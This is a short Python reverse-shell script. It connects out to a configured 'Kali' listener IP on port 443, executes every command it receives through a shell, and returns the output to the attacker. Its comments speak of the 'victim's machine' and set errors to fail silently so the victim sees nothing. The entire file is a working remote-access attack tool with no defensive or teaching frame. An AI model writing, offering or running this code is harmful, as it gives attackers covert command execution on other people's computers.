import socket
import subprocess
import os

# CONFIGURATION: Set your Kali Linux listener IP and Port
# Ensure these match your Metasploit LHOST and LPORT settings.
KALI_IP = "192.168...."
KALI_PORT = 443

def connect():
    try:
        # Initialize a TCP/IP socket using IPv4 (AF_INET) and Streaming (SOCK_STREAM)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Attempt to establish a connection to the remote attacker machine
        s.connect((KALI_IP, KALI_PORT))

        # Main loop to receive and execute incoming commands from the listener
        while True:
            # Buffer size of 1024 bytes; decode the received bytes into a UTF-8 string
            data = s.recv(1024).decode("utf-8").strip()

            # If the received command is 'exit', terminate the session
            if data.lower() == "exit":
                break

            if len(data) > 0:
                # Execute the received string as a system command
                # shell=True allows for command chaining, pipes, and built-in shell commands
                # stdout/stderr/stdin are redirected to pipes to be captured by this script
                proc = subprocess.Popen(
                    data, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    stdin=subprocess.PIPE
                )
                
                # Combine standard output and error messages into a single byte string
                output_bytes = proc.stdout.read() + proc.stderr.read()

                # Send the execution results back to the Kali listener
                s.send(output_bytes)

        # Gracefully close the connection after exiting the loop
        s.close()
    except Exception:
        # Silent failure to avoid pop-up errors on the victim's machine
        pass

if __name__ == "__main__":
    connect()
